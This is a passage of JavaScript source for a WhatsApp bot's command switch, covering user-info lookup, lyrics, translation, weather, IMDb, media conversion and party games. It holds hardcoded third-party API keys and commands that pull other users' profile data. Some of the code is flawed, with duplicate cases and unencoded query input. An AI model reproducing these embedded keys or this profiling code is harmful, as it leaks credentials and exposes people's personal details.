            conn.profilePictureUrl(userJid, 'image').catch(() => null),
            conn.fetchStatus(userJid).catch(() => null),
            conn.getBusinessProfile(userJid).catch(() => null),
            conn.fetchBlocklist().then(blocklist => 
                blocklist && Array.isArray(blocklist) ? blocklist.includes(userJid) : false
            ).catch(() => false)
        ]).then(results => [
            results[0].status === 'fulfilled' ? results[0].value : null,
            results[1].status === 'fulfilled' ? results[1].value : null,
            results[2].status === 'fulfilled' ? results[2].value : null,
            results[3].status === 'fulfilled' ? results[3].value : false
        ]);

        // Get group-specific info if in a group
        let groupRole = "Not in this group";
        let isAdmin = false;
        
        if (m.isGroup && participants && Array.isArray(participants)) {
            const participant = participants.find(p => p.id === userJid);
            if (participant) {
                groupRole = participant.admin ? 
                    (participant.admin === 'superadmin' ? 'Group Owner' : 'Admin') : 'Member';
                isAdmin = !!participant.admin;
            }
        }

        // Check if user is premium/owner/contributor with safe access
        const premList = JSON.parse(fs.readFileSync('./start/lib/database/premium.json', 'utf-8') || '[]');
        const isPremium = Array.isArray(premList) ? premList.includes(userJid) : false;

        const kontributorList = JSON.parse(fs.readFileSync('./start/lib/database/owner.json', 'utf-8') || '[]');
        const isContributor = Array.isArray(kontributorList) ? kontributorList.includes(userJid.replace('@s.whatsapp.net', '')) : false;

        // Safely check if user is owner
        const isOwner = Array.isArray(global.owner) ? 
            global.owner.includes(userJid.replace('@s.whatsapp.net', '')) : 
            (global.ownernumber === userJid.replace('@s.whatsapp.net', ''));

        // Format user info
        const userInfo = `
👤 *USER INFORMATION*

📛 *Name:* ${username}
📞 *Number:* ${userJid.replace('@s.whatsapp.net', '')}
🆔 *JID:* ${userJid}

✅ *WhatsApp Status:* Registered
🏢 *Business Account:* ${isBusiness ? 'Yes' : 'No'}
⭐ *Premium User:* ${isPremium ? 'Yes' : 'No'}
👑 *Bot Owner:* ${isOwner ? 'Yes' : 'No'}
🤝 *Contributor:* ${isContributor ? 'Yes' : 'No'}
🚫 *Blocked:* ${isBlocked ? 'Yes' : 'No'}

📝 *About:* ${aboutInfo?.status || 'Not set'}
🕒 *Last Updated:* ${aboutInfo?.setAt ? new Date(aboutInfo.setAt).toLocaleString() : 'Unknown'}

${m.isGroup ? `👥 *Group Role:* ${groupRole}\n📊 *Is Admin:* ${isAdmin ? 'Yes' : 'No'}\n` : ''}

🔗 *Profile Picture:* ${profilePicture ? 'Available' : 'Not available'}
        `.trim();

        // Send user info
        if (profilePicture) {
            await conn.sendMessage(
                m.chat,
                {
                    image: { url: profilePicture },
                    caption: userInfo,
                    mentions: [userJid]
                },
                { quoted: m }
            );
        } else {
            await conn.sendMessage(
                m.chat, 
                { 
                    text: userInfo,
                    mentions: [userJid],
                    contextInfo: {
                        externalAdReply: {
                            title: `User Info - ${username}`,
                            body: `Requested by ${pushname || 'Unknown'}`,
                            thumbnail: await getBuffer('https://files.catbox.moe/uy3kq9.jpg').catch(() => null),
                            mediaType: 1,
                            sourceUrl: 'https://whatsapp.com'
                        }
                    }
                },
                { quoted: m }
            );
        }

    } catch (error) {
        console.error('Error in userinfo command:', error);
        reply('❌ *An error occurred while fetching user information. Please try again.*');
    }
    
}
break
case "npm": {
try {
    // Check if a package name is provided
    if (!args.length) {
      return reply("Please provide the name of the npm package you want to search for. Example: .npm express");
    }

    const packageName = args.join(" ");
    const apiUrl = `https://registry.npmjs.org/${encodeURIComponent(packageName)}`;

    // Fetch package details from npm registry
    const response = await axios.get(apiUrl);
    if (response.status !== 200) {
      throw new Error("Package not found or an error occurred.");
    }

    const packageData = response.data;
    const latestVersion = packageData["dist-tags"].latest;
    const description = packageData.description || "No description available.";
    const npmUrl = `https://www.npmjs.com/package/${packageName}`;
    const license = packageData.license || "Unknown";
    const repository = packageData.repository ? packageData.repository.url : "Not available";

    // Create the response message
    const message = `
*${global.botname} npm search*

*👀 NPM PACKAGE:* ${packageName}
*📄 DESCRIPTION:* ${description}
*⏸️ LAST VERSION:* ${latestVersion}
*🪪 LICENSE:* ${license}
*🪩 REPOSITORY:* ${repository}
*🔗 NPM URL:* ${npmUrl}
`;

    // Send the message
    await conn.sendMessage(from, { text: message }, { quoted: mek });

  } catch (error) {
    console.error("Error:", error);
    reply("An error occurred: " + error.message);
  }
}
break
case "kevinfarm": {
const familyList = `
         *[ • JEXPLOIT 𝖥𝖠𝖬𝖨𝖫𝖸 • ]*

    [ • KEVIN: KING👸 ]
       *•────────────•⟢*
                *𝖥𝖱𝖨𝖤𝖭𝖣’𝖲*
      *╭┈───────────────•*
      *│  ◦* *▢➠ Malvin king*
      *│  ◦* *▢➠ The great lonelysaam*
      *│  ◦* *▢➠ Dev sung*
      *│  ◦* *▢➠ Terri*
      *│  ◦* *▢➠ Trendx*
      *│  ◦* *▢➠ Lord Voyage*
      *│  ◦* *▢➠ goodnesstech*
      *╰┈───────────────•*
        *•────────────•⟢*
    `;
    try {
        // Envoi de la réponse avec l'image et la liste de la famille
        await conn.sendMessage(m.chat, {
            image: { url: "https://files.catbox.moe/9sazwf.jpg" },
            caption: familyList.trim()
        }, { quoted: mek });
    } catch (error) {
        console.error(error);
        reply("❌ *An error occurred while fetching the family list. Please try again.*");
    }
}
break
case "userinfo":
case "ui": {
    try {
        // 1. DETERMINE TARGET USER
        let userJid = quoted?.sender || 
                     mek.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0] || 
                     sender;

        // 2. VERIFY USER EXISTS
        const [user] = await conn.onWhatsApp(userJid).catch(() => []);
        if (!user?.exists) return reply("❌ User not found on WhatsApp");

        // 3. GET PROFILE PICTURE
        let ppUrl;
        try {
            ppUrl = await conn.profilePictureUrl(userJid, 'image');
        } catch {
            ppUrl = 'https://i.ibb.co/KhYC4FY/1221bc0bdd2354b42b293317ff2adbcf-icon.png';
        }

        // 4. GET NAME (MULTI-SOURCE FALLBACK)
        let userName = userJid.split('@')[0];
        try {
            // Try group participant info first
            if (isGroup) {
                const member = participants.find(p => p.id === userJid);
                if (member?.notify) userName = member.notify;
            }
            
            // Try contact DB
            if (userName === userJid.split('@')[0] && conn.contactDB) {
                const contact = await conn.contactDB.get(userJid).catch(() => null);
                if (contact?.name) userName = contact.name;
            }
            
            // Try presence as final fallback
            if (userName === userJid.split('@')[0]) {
                const presence = await conn.presenceSubscribe(userJid).catch(() => null);
                if (presence?.pushname) userName = presence.pushname;
            }
        } catch (e) {
            console.log("Name fetch error:", e);
        }

        // 5. GET BIO/ABOUT
        let bio = {};
        try {
            // Try personal status
            const statusData = await conn.fetchStatus(userJid).catch(() => null);
            if (statusData?.status) {
                bio = {
                    text: statusData.status,
                    type: "Personal",
                    updated: statusData.setAt ? new Date(statusData.setAt * 1000) : null
                };
            } else {
                // Try business profile
                const businessProfile = await conn.getBusinessProfile(userJid).catch(() => null);
                if (businessProfile?.description) {
                    bio = {
                        text: businessProfile.description,
                        type: "Business",
                        updated: null
                    };
                }
            }
        } catch (e) {
            console.log("Bio fetch error:", e);
        }

        // 6. GET GROUP ROLE
        let groupRole = "";
        if (isGroup) {
            const participant = participants.find(p => p.id === userJid);
            groupRole = participant?.admin ? "👑 Admin" : "👥 Member";
        }

        // 7. FORMAT OUTPUT
        const formattedBio = bio.text ? 
            `${bio.text}\n└─ 📌 ${bio.type} Bio${bio.updated ? ` | 🕒 ${bio.updated.toLocaleString()}` : ''}` : 
            "No bio available";

        const userInfo = `
*GC MEMBER INFORMATION 🧊*

📛 *Name:* ${userName}
🔢 *Number:* ${userJid.replace(/@.+/, '')}
📌 *Account Type:* ${user.isBusiness ? "💼 Business" : user.isEnterprise ? "🏢 Enterprise" : "👤 Personal"}

*📝 About:*
${formattedBio}

*⚙️ Account Info:*
✅ Registered: ${user.isUser ? "Yes" : "No"}
🛡️ Verified: ${user.verifiedName ? "✅ Verified" : "❌ Not verified"}
${isGroup ? `👥 *Group Role:* ${groupRole}` : ''}
`.trim();

        // 8. SEND RESULT
        await conn.sendMessage(from, {
            image: { url: ppUrl },
            caption: userInfo,
            mentions: [userJid]
        }, { quoted: mek });

    } catch (e) {
        console.error("Person command error:", e);
        reply(`❌ Error: ${e.message || "Failed to fetch profile"}`);
    }
}
break
case "trt": 
case "translate": {
if (!text) {
            return reply(`🌍 *Translate to English*\n\nUsage: ${prefix}translate <text>\n\nExamples:\n• ${prefix}translate Hola\n• ${prefix}translate Bonjour\n• ${prefix}translate 你好`);
        }

        try {
            // React immediately
            await conn.sendMessage(m.chat, {
                react: { text: "🌍", key: m.key }
            });

            const apiUrl = `https://api.popcat.xyz/v2/translate?to=en&text=${encodeURIComponent(text)}`;
            const res = await fetch(apiUrl, { timeout: 10000 });
            const data = await res.json();

            // Check for errors
            if (data.error === true) {
                return reply(`❌ Translation failed: ${data.message || 'Unknown error'}`);
            }

            
            let translated = data.message?.translated;
            
            // If translated is still an object, try to extract string
            if (translated && typeof translated === 'object') {
                translated = translated.text || translated.translated || JSON.stringify(translated);
            }
            
            // Validate we have a string
            if (!translated || typeof translated !== 'string') {
                return reply(`❌ Translation failed. Could not extract translation from response.`);
            }

            // Clean and format
            await conn.sendMessage(m.chat, {
                text: `*TRANSLATION*\n\n🗣️ *Original:* ${text}\n\n*Translatd:* ${translated}\n\n`
            }, { quoted: m });

        } catch (error) {
            console.error('Translate error:', error);
            
            if (error.message.includes('timeout')) {
                reply('⏰ Translation timeout. Try shorter text.');
            } else {
                reply('❌ Translation failed. Try again.');
            }
        }
}
break
case 'tovideo': {
if (!text) reply(`reply stiker with caption *${prefix + command}*`)
var media = await conn.downloadAndSaveMediaMessage(quoted, new Date * 1)
let webpToMp4 = await webp2mp4File(media)
conn.sendMessage(m.chat, { video: {url: webpToMp4.result}, caption: 'Convert Sticker To Video'}, { quoted: m })
await fs.unlinkSync(media)
}
break
case "toimage": {
const quoted = m.quoted || m.msg?.quoted;
    const mime = quoted?.mimetype || quoted?.msg?.mimetype;
    if (!quoted || !/webp/.test(mime)) {
      return reply(`*Send or reply to a sticker with the caption ${prefix + command}*`);
    }

    try {
      const media = await quoted.download();
      const inputPath = path.join(__dirname, getRandom('.webp'));
      fs.writeFileSync(inputPath, media);
      const outputPath = path.join(__dirname, getRandom('.png'));
      exec(`ffmpeg -i ${inputPath} ${outputPath}`, (err) => {
        fs.unlinkSync(inputPath); 

        if (err) {
          console.error('Error converting to image:', err);
          return reply('An error occurred while converting the sticker to an image.');
        }
        const buffer = fs.readFileSync(outputPath);
        conn.sendMessage(m.chat, { image: buffer }, { quoted: m });    
        fs.unlinkSync(outputPath);
      });
    } catch (error) {
      console.error('Error converting to image:', error);
      reply('An error occurred while converting the sticker to an image.');
    }
}
//=====[SEARCH MENU CMDS]======
break
case "lyrics2": {
    try {
        if (!q) return reply("Please provide a song title. Example: .lyrics shape of you");
        
        const apiUrl = `https://api.giftedtech.co.ke/api/search/lyrics?apikey=gifted&query=${encodeURIComponent(q)}`;
        
        // Fetch response from API
        const response = await fetch(apiUrl);
        const result = await response.json();
        
        // Ensure the response is always a string
        let lyricsText;
        if (result.status && result.data) {
            if (typeof result.data === 'string') {
                lyricsText = result.data;
            } else if (result.data.lyrics) {
                lyricsText = `🎵 *${result.data.title || q}* 🎵\n\n${result.data.lyrics}`;
            } else {
                lyricsText = JSON.stringify(result.data);
            }
        } else if (result.result) {
            lyricsText = typeof result.result === 'string' ? result.result : JSON.stringify(result.result);
        } else {
            lyricsText = "🚫 No lyrics found for this song.";
        }
        
        // Ensure it's a string and not too long
        const safeText = String(lyricsText || "🚫 No lyrics found.").substring(0, 4000);
        
        reply(safeText);
        
    } catch (error) {
        console.error('Error fetching lyrics:', error);
        reply("❌ Error fetching lyrics. Please try again later.");
    }
}
break
// ========== LYRICS COMMAND ==========
case 'lyrics': {
      if (!text) {
            return reply(`🎵 *Lyrics Finder*\n\nUsage: ${prefix}lyrics <song name>\n\nExamples:\n• ${prefix}lyrics shape of you\n• ${prefix}lyrics Sekkle down by bunnie Gunter\n• ${prefix}lyrics Blinding Lights The Weeknd`);
        }

        try {
            await reply(`🔍 Searching lyrics for: *"${text}"*...`);

            const apiUrl = `https://api.popcat.xyz/v2/lyrics?song=${encodeURIComponent(text)}`;
            const res = await fetch(apiUrl, { timeout: 15000 });
            
            if (!res.ok) throw new Error(`API status: ${res.status}`);
            
            const data = await res.json();

            // Check for error flag
            if (data.error === true) {
                return reply(`No lyrics found for *"${text}"*\n\nTry:\n• Add artist name\n• Check spelling\n• Use exact title`);
            }

            
            if (!data.message || typeof data.message !== 'object' || !data.message.lyrics) {
                return reply(`Lyrics not available for *"${text}"*`);
            }

            const lyricsData = data.message;
            const lyrics = lyricsData.lyrics;
            const artist = lyricsData.artist || 'Unknown';
            const title = lyricsData.title || text;
            const image = lyricsData.image;

            // Clean up lyrics (remove "Contributor" line if present)
            const cleanLyrics = lyrics.replace(/^\d+\s+Contributor.*?\n/i, '');

            // Format message (max 4000 chars for WhatsApp)
            let message = `🎵 *${title}*\n🎤 *Artist:* ${artist}\n\n📖 *Lyrics:*\n\n${cleanLyrics}`;
            
            if (message.length > 3500) {
                message = message.substring(0, 3500) + '\n\n*Lyrics truncated - song too long*';
            }
            
            message += `\n\n${global.wm || ''}`;

            // Send image first if available
            if (image && typeof image === 'string' && image.includes('http') && !image.includes('default_cover_image')) {
                try {
                    await conn.sendMessage(m.chat, {
                        image: { url: image },
                        caption: `🎵 *${title}*\n🎤 *Artist:* ${artist}`
                    }, { quoted: m });
                    
                    // Small delay
                    await new Promise(resolve => setTimeout(resolve, 300));
                } catch (e) {
                    console.log('Image failed:', e.message);
                }
            }

            // Send lyrics
            await conn.sendMessage(m.chat, { text: message }, { quoted: m });

        } catch (error) {
            console.error('Lyrics error:', error);
            
            let errMsg = `Error: ${error.message}`;
            if (error.message.includes('timeout')) errMsg = 'Request timed out';
            if (error.message.includes('network')) errMsg = 'Network error';
            if (error.message.includes('status: 5')) errMsg = 'Service unavailable';
            
            reply(`${errMsg}\n\nTry again in a few moments!`);
        }
}
break
case 'playstore':
case 'ps': {
    const query = body.slice(command.length + 1).trim();
    if (!query) return reply("*Provide app name*.");
    
    await conn.sendMessage(m.chat, { 
        text: `🔍 Searching PlayStore for "${query}"...` 
    }, { quoted: m });
    
    const result = await playstoreSearch(query);
    await conn.sendMessage(m.chat, { text: result }, { quoted: m });
    
}
break
case "yts": 
case "ytsearch": {
    if (!text) return reply(`📌 *Example: ${prefix + command} Eminem Godzilla*`);

      try {
        const searchResults = await yts(text);
        if (!searchResults.all.length) return reply("❌ *No YouTube results found.*");

        let responseText = `🎥 *YouTube Search Results for:* ${text}\n\n`;
        searchResults.all.slice(0, 10).forEach((video, index) => {
          responseText += `□ *${index + 1}.* ${video.title}\n□ *Uploaded:* ${video.ago}\n□ *Views:* ${video.views}\n□ *Duration:* ${video.timestamp}\n□ *URL:* ${video.url}\n\n─────────────────\n\n`;
        });

        await conn.sendMessage(
          m.chat,
          { image: { url: searchResults.all[0].thumbnail }, caption: responseText },
          { quoted: m }
        );
      } catch (error) {
        console.error("YT Search command failed:", error);
        reply("❌ *An error occurred while fetching YouTube search results.*");
      }
}
break
case 'ytplay':
case 'ytaudio': {
    await ytplayCommand(conn, m.chat, text, m);
   
}
break
case 'song2': {
      if (!text) return reply('*Please provide a song name!*');

    try {
      const search = await yts(text);
      if (!search || search.all.length === 0) return reply('*The song you are looking for was not found.*');

      const video = search.all[0];
      const downloadUrl = await fetchMp3DownloadUrl(video.url);

      await conn.sendMessage(m.chat, {
        audio: { url: downloadUrl },
        mimetype: 'audio/mpeg',
        fileName: `${video.title}.mp3`
      }, { quoted: m });

    } catch (error) {
      console.error('play command failed:', error);
      reply(`Error: ${error.message}`);
    }
  }
break
case "imdb":
case "movie": {
if (!text) return reply("Provide a movie or series name.");
      
      try {
        const { data } = await axios.get(`http://www.omdbapi.com/?apikey=742b2d09&t=${text}&plot=full`);
        if (data.Response === "False") throw new Error();

        const imdbText = `🎬 *IMDB SEARCH*\n\n`
          + `*Title:* ${data.Title}\n*Year:* ${data.Year}\n*Rated:* ${data.Rated}\n`
          + `*Released:* ${data.Released}\n*Runtime:* ${data.Runtime}\n*Genre:* ${data.Genre}\n`
          + `*Director:* ${data.Director}\n*Actors:* ${data.Actors}\n*Plot:* ${data.Plot}\n`
          + `*IMDB Rating:* ${data.imdbRating} ⭐\n*Votes:* ${data.imdbVotes}`;

        conn.sendMessage(m.chat, { image: { url: data.Poster }, caption: imdbText }, { quoted: m });
      } catch (error) {
        reply("❌ Unable to fetch IMDb data.");
      }
}
break
case 'define': {
    if (!text) return reply(`Usage: ${prefix}define <word>`);
    
    try {
        const apiUrl = `https://api.giftedtech.co.ke/api/tools/define?apikey=gifted&term=${encodeURIComponent(text)}`;
        const response = await fetch(apiUrl);
        const data = await response.json();
        
        console.log('API Response:', data); // Check what's actually being returned
        
        // Based on your screenshot, the response might have different structure
        if (data.success && data.results && data.results[0]) {
            const result = data.results[0];
            
            // Check what fields are available
            console.log('Available fields:', Object.keys(result));
            
            // Try common definition fields
            if (result.definition) {
                reply(result.definition);
            } else if (result.meaning) {
                reply(result.meaning);
            } else {
                reply('❌ Definition field not found. Available fields: ' + Object.keys(result).join(', '));
            }
        } else {
            reply('❌ No definition found for: ' + text);
        }
    } catch (error) {
        console.error('Define Error:', error);
        reply('❌ Error: ' + error.message);
    }
    
}
break
case "weather": {
if (!text) return reply("Provide a location.");

      try {
        const { data } = await axios.get(`https://api.openweathermap.org/data/2.5/weather?q=${text}&units=metric&appid=060a6bcfa19809c2cd4d97a212b19273`);
        
        const weatherInfo = `🌤️ *Weather for ${text}*\n\n`
          + `🌡️ *Temperature:* ${data.main.temp}°C (Feels like ${data.main.feels_like}°C)\n`
          + `🌪️ *Weather:* ${data.weather[0].main} - ${data.weather[0].description}\n`
          + `💨 *Wind Speed:* ${data.wind.speed} m/s\n`
          + `📍 *Coordinates:* ${data.coord.lat}, ${data.coord.lon}\n`
          + `🌍 *Country:* ${data.sys.country}`;

        conn.sendMessage(m.chat, { text: weatherInfo }, { quoted: m });
      } catch (error) {
        reply("❌ Unable to fetch weather data.");
      }
}
break
case "shazam": {
 const quoted = m.quoted ? m.quoted : null || m.msg ;
 const mime = quoted?.mimetype || ""; 
      if (!quoted || !/audio|video/.test(mime)) return reply("Reply to an audio or video to identify music.");
      
try {
    const media = await m.quoted.download();
    const filePath = `./tmp/${m.sender}.${mime.split('/')[1]}`;
    fs.writeFileSync(filePath, media);
    const res = await acr.identify(fs.readFileSync(filePath));
    if (res.status.code != 0) throw new Error(res.status.msg);

    //  this check before accessing music[0]
    if (!res.metadata?.music || res.metadata.music.length === 0) {
        return reply("No music identified in this audio/video.");
    }

    const { title, artists, album, release_date } = res.metadata.music[0];
    const resultText = `  *Music Identified!*\n\n*Title:* ${title}\n*Artist(s):* ${artists.map(v => v.name).join(', ')}\n*Album:* ${album?.name || 'Unknown'}\n*Release Date:* ${release_date || 'Unknown'}`;
    
    reply(resultText);
} catch (error) {
    console.error(error);
    reply("Error identifying music: " + error.message);
      }
}
break
//=====[FUN MENU CMDS]======
case 'chord':
case 'cr': {
  if(!text) return m.reply(`*query input*`);
  let anu = `https://api.diioffc.web.id/api/search/chord?query=${encodeURIComponent(text)}`;
  const res = await fetch(anu)
  const response = await res.json();
  m.reply(`Url: ${response.result.url}\nArtis: ${response.result.artist}\nArtisUrl: ${response.result.artistUrl}\nJudul: ${response.result.title}\nChord: ${response.result.chord}`), { quoted: m };
}
break
case "dares":
case "dare": {

    await dareCommand(conn, from, m);
    
}
break
case "truth": {

    await truthCommand(conn, from, m);
    
}
break
case "truthdetecter": {
   if (!m.quoted) return reply(`Please reply to the message you want to detect!`);

    let responses = [
      "That's a blatant lie!",
      "Truth revealed!",
      "Lie alert!",
      "Hard to believe, but true!",
      "Professional liar detected!",
      "Fact-check: TRUE",
      "Busted! That's a lie!",
      "Unbelievable, but FALSE!",
      "Detecting... TRUTH!",
      "Lie detector activated: FALSE!",
      "Surprisingly, TRUE!",
      "My instincts say... LIE!",
      "That's partially true!",
      "Can't verify, try again!",
      "Most likely, TRUE!",
      "Don't believe you!",
      "Surprisingly, FALSE!",
      "Truth!",
      "Honest as a saint!",
      "Deceptive much?",
      "Absolutely true!",
      "Completely false!",
      "Seems truthful.",
      "Not buying it!",
      "You're lying through your teeth!",
      "Hard to believe, but it's true!",
      "I sense honesty.",
      "Falsehood detected!",
      "Totally legit!",
      "Lies, lies, lies!",
      "You can't fool me!",
      "Screams truth!",
      "Fabrication alert!",
      "Spot on!",
      "Fishy story, isn't it?",
      "Unquestionably true!",
      "Pure fiction!"
    ];

    let result = responses[Math.floor(Math.random() * responses.length)];
    let replyText = `*RESULT*: ${result}`;

    await reply(replyText);
}
break
case "fact": {
    try {
      const { data } = await axios.get(`https://nekos.life/api/v2/fact`);
      return reply(`*FACT:* ${data.fact}\n`);
    } catch (err) {
      console.error(err);
      return reply('*An error occurred while fetching the fact.*');
    }
}
break
case "Quotes": {
  try {
    const { data } = await axios.get(`https://favqs.com/api/qotd`);
    const textquotes = `*QUOTE:* ${data.quote.body}\n\n*AUTHOR:* ${data.quote.author}`;
    return reply(textquotes);
  } catch (err) {
    console.error(err);
    return reply('*An error occurred while fetching the quote.*');
  }
}
break
case "truth": {
const truths = [
      "What's your biggest fear?",
      "Have you ever lied to your best friend?",
      "What's your deepest secret?",
      "Who's your secret crush?",
      "What's the biggest mistake you've ever made?",
      "Have you ever cheated on a test?",
      "What's the most embarrassing thing that's ever happened to you?",
      "Do you have a hidden talent?",
      "What's the biggest lie you've ever told?",
      "Have you ever been in love?",
      "What's the most spontaneous thing you've ever done?",
      "Who's the person you trust most?",
      "What's the biggest risk you've ever taken?",
      "Have you ever regretted something?",
      "What's the most memorable gift you've received?",
      "Have you ever had a crush on someone older?",
      "What's the biggest lesson you've learned?",
      "Have you ever broken someone's heart?",
      "What's the most exciting thing you've done?",
      "Do you believe in soulmates?",
      "What's the biggest challenge you've faced?",
      "Have you ever kept a secret from your parents?",
      "What's the most creative thing you've done?",
      "Have you ever felt betrayed?",
      "What's the biggest adventure you've been on?",
      "Have you ever had a rival?",
      "What's the most thoughtful thing someone's done for you?",
      "Have you ever forgiven someone?",
      "What's the biggest obstacle you've overcome?",
      "Do you believe in karma?",
      "What's the most romantic thing someone's done for you?",
      "Have you ever taken a risk for love?",
      "What's the biggest surprise you've ever received?",
      "Have you ever had a paranormal experience?",
      "What's the most inspiring story you've heard?",
      "Have you ever helped someone in need?",
      "What's the biggest accomplishment you're proud of?",
    ];

    const truthMessage = truths[Math.floor(Math.random() * truths.length)];
    const buffer = await getBuffer('https://i.ibb.co/305yt26/bf84f20635dedd5dde31e7e5b6983ae9.jpg');

    await conn.sendMessage(
      from,
      {
        image: buffer,
        caption: `*TRUTH*\n${truthMessage}`,
      },
      { quoted: m }
     );
        
}
break
case "compatibility":
case "comp": {
    try {
        // Check if two users are mentioned
        if (!m.mentionedJid || m.mentionedJid.length < 2) {
            return reply("Please mention two users to calculate compatibility.\nUsage: `.compatibility @user1 @user2`");
        }

        const [user1, user2] = m.mentionedJid.slice(0, 2);
        
        // Calculate random compatibility score (1-1000)
        let compatibilityScore = Math.floor(Math.random() * 1000) + 1;

        // Special case for bot owner (replace '256742932677' with your actual owner number)
        const ownerNumber = "256742932677@s.whatsapp.net";
        if (user1 === ownerNumber || user2 === ownerNumber) {
            compatibilityScore = 1000;
        }

        // Format the response
        const resultMessage = 
            `💖 *Compatibility Result* 💖\n\n` +
            `@${user1.split('@')[0]} ❤️ @${user2.split('@')[0]}\n` +
            `Score: ${compatibilityScore}/1000\n\n` +
            `${getCompatibilityMessage(compatibilityScore)}`;

        // Send the result
        await conn.sendMessage(
            m.chat,
            { 
                text: resultMessage,
                mentions: [user1, user2]
            },
            { quoted: m }
        );

    } catch (error) {
        console.error('Error in compatibility command:', error);
        reply(`❌ Error: ${error.message}`);
    }
    break;
}

// Helper function to get a fun message based on score
function getCompatibilityMessage(score) {
    if (score >= 900) return "Soulmates! 💞 You're perfect for each other!";
    if (score >= 700) return "Great match! 💕 You complement each other well.";
    if (score >= 500) return "Good potential! 💗 With some work, this could be great.";
    if (score >= 300) return "Not bad! 💖 There's some chemistry here.";
    return "Might need some work... 💔 But don't give up!";
}
break
case "compliment": {
let compliments = [
        "You're amazing just the way you are! 💖",
        "You light up every room you walk into! 🌟",
        "Your smile is contagious! 😊",
        "You're a genius in your own way! 🧠",
        "You bring happiness to everyone around you! 🥰",
        "You're like a human sunshine! ☀️",
        "Your kindness makes the world a better place! ❤️",
        "You're unique and irreplaceable! ✨",
        "You're a great listener and a wonderful friend! 🤗",
        "Your positive vibes are truly inspiring! 💫",
        "You're stronger than you think! 💪",
        "Your creativity is beyond amazing! 🎨",
        "You make life more fun and interesting! 🎉",
        "Your energy is uplifting to everyone around you! 🔥",
        "You're a true leader, even if you don’t realize it! 🏆",
        "Your words have the power to make people smile! 😊",
        "You're so talented, and the world needs your skills! 🎭",
        "You're a walking masterpiece of awesomeness! 🎨",
        "You're proof that kindness still exists in the world! 💕",
        "You make even the hardest days feel a little brighter! ☀️"
    ];

    let randomCompliment = compliments[Math.floor(Math.random() * compliments.length)];
    let sender = `@${mek.sender.split("@")[0]}`;
    let mentionedUser = m.mentionedJid[0] || (mek.quoted && mek.quoted.sender);
    let target = mentionedUser ? `@${mentionedUser.split("@")[0]}` : "";

    let message = mentionedUser 
        ? `${sender} complimented ${target}:\n😊 *${randomCompliment}*`
        : `${sender}, you forgot to tag someone! But hey, here's a compliment for you:\n😊 *${randomCompliment}*`;

    await conn.sendMessage(mek.chat, { text: message, mentions: [mek.sender, mentionedUser].filter(Boolean) }, { quoted: mek });
}
break
case "8balls": {
if (!q) return reply("Ask a yes/no question! Example: .8ball Will I be rich?");
    
    let responses = [
        "Yes!", "No.", "Maybe...", "Definitely!", "Not sure.", 
        "Ask again later.", "I don't think so.", "Absolutely!", 
        "No way!", "Looks promising!"
    ];
    
    let answer = responses[Math.floor(Math.random() * responses.length)];
    
    reply(`🎱 *Magic 8-Ball says:* ${answer}`);
}
break
case "lovetest": {
if (args.length < 2) return reply("Tag two users! Example: .lovetest @user1 @user2");

    let user1 = args[0].replace("@", "") + "@s.whatsapp.net";
    let user2 = args[1].replace("@", "") + "@s.whatsapp.net";

    let lovePercent = Math.floor(Math.random() * 100) + 1; // Generates a number between 1-100

    let messages = [
        { range: [90, 100], text: "💖 *A match made in heaven!* True love exists!" },
        { range: [75, 89], text: "😍 *Strong connection!* This love is deep and meaningful." },
        { range: [50, 74], text: "😊 *Good compatibility!* You both can make it work." },
        { range: [30, 49], text: "🤔 *It’s complicated!* Needs effort, but possible!" },
        { range: [10, 29], text: "😅 *Not the best match!* Maybe try being just friends?" },
        { range: [1, 9], text: "💔 *Uh-oh!* This love is as real as a Bollywood breakup!" }
    ];

    let loveMessage = messages.find(msg => lovePercent >= msg.range[0] && lovePercent <= msg.range[1]).text;

    let message = `💘 *Love Compatibility Test* 💘\n\n❤️ *@${user1.split("@")[0]}* + *@${user2.split("@")[0]}* = *${lovePercent}%*\n${loveMessage}`;

    await conn.sendMessage(mek.chat, { text: message, mentions: [user1, user2] }, { quoted: mek });
}
break
case "emoji": {
try {
            // Join the words together in case the user enters multiple words
            let text = args.join(" ");
            
            // Map text to corresponding emoji characters
            let emojiMapping = {
                "a": "🅰️",
                "b": "🅱️",
                "c": "🇨️",
                "d": "🇩️",
                "e": "🇪️",
                "f": "🇫️",
                "g": "🇬️",
                "h": "🇭️",
                "i": "🇮️",
                "j": "🇯️",
                "k": "🇰️",
                "l": "🇱️",
                "m": "🇲️",
                "n": "🇳️",
                "o": "🅾️",
                "p": "🇵️",
                "q": "🇶️",
                "r": "🇷️",
                "s": "🇸️",
                "t": "🇹️",
                "u": "🇺️",
                "v": "🇻️",
                "w": "🇼️",
                "x": "🇽️",
                "y": "🇾️",
                "z": "🇿️",
                "0": "0️⃣",
                "1": "1️⃣",
                "2": "2️⃣",
                "3": "3️⃣",
                "4": "4️⃣",
                "5": "5️⃣",
                "6": "6️⃣",
                "7": "7️⃣",
                "8": "8️⃣",
                "9": "9️⃣",
                " ": "␣", // for space
            };

            // Convert the input text into emoji form
            let emojiText = text.toLowerCase().split("").map(char => emojiMapping[char] || char).join("");

            // If no valid text is provided
            if (!text) {
                return reply("Please provide some text to convert into emojis!");
            }

            await conn.sendMessage(mek.chat, {
                text: emojiText,
            }, { quoted: mek });

        } catch (error) {
            console.log(error);
            reply(`Error: ${error.message}`);
        }
}
break
case "jokes": {
 try {
      let res = await fetch("https://official-joke-api.appspot.com/random_joke");
      let json = await res.json();
      await conn.sendMessage(m.chat, { text: json.value }, { quoted: m });
    } catch (error) {
      console.error('Error fetching joke:', error);
      reply('An error occurred while fetching a joke.');
    }
}
break
case "valentines": {
    try {
        let res = await fetch("https://api.giftedtech.co.ke/api/fun/valentines?apikey=gifted");
        
        if (!res.ok) {
            throw new Error(`API request failed with status ${res.status}`);
        }
        
        let json = await res.json();
        
        // Check if the response has the expected structure
        if (json && json.success && json.result) {
            await conn.sendMessage(m.chat, { text: `💝 ${json.result}` }, { quoted: m });
        } else {
            throw new Error('Invalid API response structure');
        }
        
    } catch (error) {
        console.error('Error fetching valentine message:', error);
        reply('Sorry, I couldn\'t fetch a valentine message at the moment. Please try again later.');
    }
}
break
case "pickupline": {
try {
        // Fetch pickup line from the API
        const res = await fetch('https://api.popcat.xyz/pickuplines');
        
        if (!res.ok) {
            throw new Error(`API request failed with status ${res.status}`);
        }

        const json = await res.json();

        // Log the API response (for debugging purposes)
        console.log('JSON response:', json);

        // Format the pickup line message
        const pickupLine = `*Here's a pickup line for you:*\n\n"${json.pickupline}"\n\n> *© ᴅʀᴏᴘᴘᴇᴅ ʙʏ ${global.botname}*`;

